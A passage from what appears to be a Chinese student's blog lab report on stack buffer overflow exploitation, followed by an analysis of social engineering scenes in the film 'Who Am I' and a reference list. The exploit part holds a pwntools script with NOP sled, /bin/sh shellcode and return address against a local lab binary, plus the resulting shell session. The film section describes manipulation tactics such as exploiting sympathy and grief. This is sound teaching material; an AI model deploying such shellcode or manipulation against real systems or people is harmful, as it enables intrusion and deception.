<li>在 Shellcode 前增加一个 <strong>NOP 链</strong>（如 60 字节的 <code>NOP</code> 指令 <code>\x90</code>），扩大命中范围。这样，即使返回地址不完全精确，只要命中 NOP 链中的任意一个字节，代码执行也会顺利进入 Shellcode。</li>
</ol>
<p><strong>关键点：</strong></p>
<ul>
<li><strong>GDB</strong> 改变了程序的栈布局，需考虑栈地址偏移。</li>
<li><strong>NOP 链</strong> 提高了返回地址的容错能力。</li>
</ul>
<p><strong>示例：</strong><br>调整返回地址为 <code>0xffffd370</code>，在 Shellcode 前增加 60 字节的 NOP 链，使代码更鲁棒，即使偏移变化也能命中目标。</p>
</blockquote>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241116043455857.png" class="" title="image-20241116043455857">
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动目标程序</span></span><br><span class="line">p = process(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回地址（需根据实际情况调整）</span></span><br><span class="line">ret = <span class="number">0xffffd370</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode 需要是字节串</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 payload</span></span><br><span class="line">payload = <span class="string">b&quot;\x90&quot;</span>*<span class="number">60</span> + shellcode + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">140</span> - <span class="built_in">len</span>(shellcode) - <span class="number">60</span>) + p32(ret)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="comment"># 发送 payload</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp1.py</span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241116043543438.png" class="" title="image-20241116043543438">
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241116043642935.png" class="" title="image-20241116043642935">
<p>成功！</p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241116043719008.png" class="" title="image-20241116043719008">
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241116043901973.png" class="" title="image-20241116043901973">
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">core.6021  core.6296  exp1.py  level1.c  pattern.py</span><br><span class="line">core.6273  core.6373  level1   linux.py  peda-session-level1.txt</span><br><span class="line">$ ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:8d:97:a2 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    altname enp2s1</span><br><span class="line">    inet 192.168.80.16/24 brd 192.168.80.255 scope global dynamic noprefixroute ens33</span><br><span class="line">       valid_lft 60458sec preferred_lft 60458sec</span><br><span class="line">    inet6 fe80::732d:9fcc:dc18:f328/64 scope <span class="built_in">link</span> noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">moyuan</span><br><span class="line">$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux moyuan-virtual-machine 6.8.0-48-generic <span class="comment">#48~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon Oct  7 11:24:13 UTC 2 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">$ python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">To run a <span class="built_in">command</span> as administrator (user <span class="string">&quot;root&quot;</span>), use <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line">See <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">moyuan@moyuan-virtual-machine:/home/moyuan/桌面$ $  </span><br></pre></td></tr></table></figure>
<h3 id="3-实验结果"><a href="#3-实验结果" class="headerlink" title="3. 实验结果"></a>3. 实验结果</h3><ul>
<li>Windows：通过覆盖 <code>EIP</code> 并跳转到 <code>jmp esp</code> 指令，执行自定义 Shellcode 实现功能。</li>
<li>Linux：关闭 ASLR 和其他保护后，构造 <code>NOP 链</code> 和返回地址，成功实现 Shellcode 执行。</li>
</ul>
<h3 id="4-《我是谁：没有绝对安全的系统》社会工程学片段解析"><a href="#4-《我是谁：没有绝对安全的系统》社会工程学片段解析" class="headerlink" title="4.《我是谁：没有绝对安全的系统》社会工程学片段解析"></a>4.《我是谁：没有绝对安全的系统》社会工程学片段解析</h3><p><strong>影片概述</strong><br>《我是谁：没有绝对安全的系统》是一部聚焦黑客犯罪的德国悬疑电影，其剧情围绕一个普通青年黑客本杰明的视角展开。他与几个志同道合的伙伴组成黑客组织“Clay”，利用精湛的黑客技术和高超的心理博弈，展开了一系列惊心动魄的黑客行动。这部电影在悬疑与反转的基础上，融合了“社会工程学”的独特主题，引发观众对技术与人性的思考。</p>
<p><strong>社会工程学片段解析</strong><br>电影的多个关键情节中，本杰明及其团队都利用了社会工程学的技巧，这些场景不仅推动了剧情发展，还深刻揭示了社会工程学的核心——通过操控人性来突破安全防护。</p>
<h4 id="1-通过猫奴大妈突破垃圾站防线"><a href="#1-通过猫奴大妈突破垃圾站防线" class="headerlink" title="1. 通过猫奴大妈突破垃圾站防线"></a>1. <strong>通过猫奴大妈突破垃圾站防线</strong></h4><p>在本杰明团队试图潜入情报局时，他们无法通过高科技破解防护系统，于是选择“人性漏洞”。团队成员发现了一位垃圾站管理员——一个对流浪猫有特殊情感的大妈。他们利用她对猫的关注，在分散其注意力后成功绕过了入口的监控系统。</p>
<p><strong>社会工程学技巧：</strong></p>
<ul>
<li><strong>心理定位</strong>：锁定目标的大妈，分析其行为习惯和情感弱点（对猫的关注）。</li>
<li><strong>分散注意力</strong>：通过设置猫作为干扰源，让管理员失去对外部的警觉。</li>
<li><strong>信任滥用</strong>：利用目标的善良本性，营造无害的假象。</li>
</ul>
<h4 id="2-打动保安大爷进入高安保区"><a href="#2-打动保安大爷进入高安保区" class="headerlink" title="2. 打动保安大爷进入高安保区"></a>2. <strong>打动保安大爷进入高安保区</strong></h4><p>在一次行动中，本杰明以“丢失钱包”为由试图进入一个安保森严的区域。面对严谨的保安，他没有选择硬闯，而是通过自编的故事来赢得信任。本杰明伪装成无害的普通人，博取同情并引导对方放松戒备，最终成功进入目标地点。</p>
<p><strong>社会工程学技巧：</strong></p>
<ul>
<li><strong>建立信任</strong>：以平易近人的形象接近目标，利用“善意同情”策略让对方放下警惕。</li>
<li><strong>诉诸情感</strong>：虚构“担心父亲责骂”的情节激发保安的同情心。</li>
<li><strong>隐蔽操作</strong>：利用小型硬件设备将网络热点植入建筑内部。</li>
</ul>
<h4 id="3-对汉娜的心理操控"><a href="#3-对汉娜的心理操控" class="headerlink" title="3. 对汉娜的心理操控"></a>3. <strong>对汉娜的心理操控</strong></h4><p>影片的高潮部分，本杰明故意向欧洲刑警汉娜讲述了一段悲惨的身世，以及团队因多重人格障碍造成的内部分裂。通过将自己塑造成一个孤立无援的受害者，他成功激发了汉娜的母性与保护欲，使她违背规章制度放他一马，并帮助他修改身份数据，从而逃脱法律制裁。</p>
<p><strong>社会工程学技巧：</strong></p>
<ul>
<li><strong>心理诱导</strong>：巧妙塑造自身的弱势形象，通过虚构悲惨经历引导汉娜共情。</li>
<li><strong>利用软肋</strong>：本杰明了解汉娜曾经历丧子之痛，抓住这一心理弱点进行针对性说服。</li>
<li><strong>多层博弈</strong>：利用自己的黑客技能和心理优势，营造出一个可信的谎言网络，让汉娜对真相的质疑被不断引导至对自己有利的方向。</li>
</ul>
<h4 id="社会工程学的核心内涵"><a href="#社会工程学的核心内涵" class="headerlink" title="社会工程学的核心内涵"></a>社会工程学的核心内涵</h4><p>电影通过这些桥段展现了社会工程学的本质，即<strong>“技术次要，人性为主”</strong>。与其破解技术上的复杂防护系统，不如利用人性的弱点突破心理防线。在电影中，这些心理博弈不仅体现了本杰明团队的高超智慧，也揭示了现代信息社会中安全问题的一个根本事实：<strong>人永远是安全链中最脆弱的一环</strong>。</p>
<p><strong>总结</strong><br>《我是谁：没有绝对安全的系统》通过多次巧妙运用社会工程学技巧，展现了黑客行为如何依赖于对人性的深刻理解。影片以烧脑反转与紧张情节为依托，借用社会工程学的理念，提出了技术与人性交织的安全困境，为观众带来了一场关于信任与欺骗的思维盛宴。</p>
<h3 id="5-参考文献"><a href="#5-参考文献" class="headerlink" title="5.参考文献"></a>5.参考文献</h3><ol>
<li><p><strong>「红队笔记」靶机精讲：Brainpan1 - 缓冲区溢出典型利用过程，让你一次吃透</strong><br>视频链接：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1dY4y127Ld/?share_source=copy_web&amp;vd_source=d493e3187b484b27b96b5475645f6a75">Bilibili</a></p>
</li>
<li><p><strong>Windows经典栈溢出利用，听不懂赔钱</strong><br>视频链接：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1yF411Z7cW/?share_source=copy_web&amp;vd_source=d493e3187b484b27b96b5475645f6a75">Bilibili</a></p>
</li>
<li><p><strong>缓冲区溢出实验文章</strong>  </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/fightte/article/details/108834167?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=108834167&amp;sharerefer=PC&amp;sharesource=weixin_59131273&amp;sharefrom=from_link">CSDN博客</a></li>
<li><a target="_blank" rel="noopener" href="https://www.yuque.com/moyuan-e4kpf/gms3c9/vbmzly7p7n1r4pxz">语雀文档</a></li>
</ul>
</li>
<li><p><strong>栈溢出经典实验</strong><br>博客链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wintrysec/p/10616793.html">博客园</a></p>
</li>
<li><p><strong>SEED Labs 栈溢出教程</strong>  </p>
<ul>
<li>博客文章：<a target="_blank" rel="noopener" href="https://yangcheneee.github.io/posts/seed_stackoverflow/index.html">个人博客</a></li>
</ul>
</li>
<li><p><strong>长亭pwn公开课：栈溢出讲解</strong><br>视频链接：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1FW421P7Ng/?share_source=copy_web&amp;vd_source=d493e3187b484b27b96b5475645f6a75">Bilibili</a></p>
</li>
<li><p><strong>缓冲区溢出及社会工程学解读</strong>  </p>
<ul>
<li>博客链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/fightte/article/details/108834167?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=108834167&amp;sharerefer=PC&amp;sharesource=weixin_59131273&amp;sharefrom=from_link">CSDN文章</a></li>
</ul>
</li>
<li><p><strong>附加学习资源：GDB 调试和 ASLR 探索</strong>  </p>
<ul>
<li>教程来源：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wintrysec/p/10616793.html">博客园</a></li>
</ul>
</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2023 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">我是 墨鸢（作为一名网络安全工程师来说要有一个虚拟名字，来保护自己的隐私性(～￣▽￣)～）</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



</body>
</html>
